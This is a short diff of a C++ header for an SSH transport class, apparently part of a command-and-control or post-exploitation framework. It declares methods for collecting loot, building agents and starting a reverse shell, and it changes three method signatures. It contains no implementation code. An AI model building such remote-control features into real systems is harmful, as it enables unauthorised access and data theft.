@@ -26,7 +26,7 @@ private:
     ssh_session session;
     ssh_channel channel;
 
-    pClientDat authenticate();
+    int authenticate();
 public:
     Ssh_Transport(class ConnectionInstance* instance);
     //Ssh_Transport(class Log *logger, class List *list, _clientNode *node);
@@ -36,7 +36,7 @@ public:
     int send_ok() override;
     int send_err() override;
     int listen(int socket) override;
-    int read(char **buff) override;
+    int read(char **buff, int length) override;
     pClientDat get_data() override;
 
     int determine_handler() override;
@@ -44,7 +44,7 @@ public:
     int download_file(char *ptr, int is_manager, char *extra) override;
     int get_loot(char *loot) override;
     int get_info(char *ptr) override;
-    int handle(void *sess) override;
+    //int handle(void *sess) override;
     void make_agent(char *dat_ptr, char *d_ptr) override;
     int init_reverse_shell() override;
 };
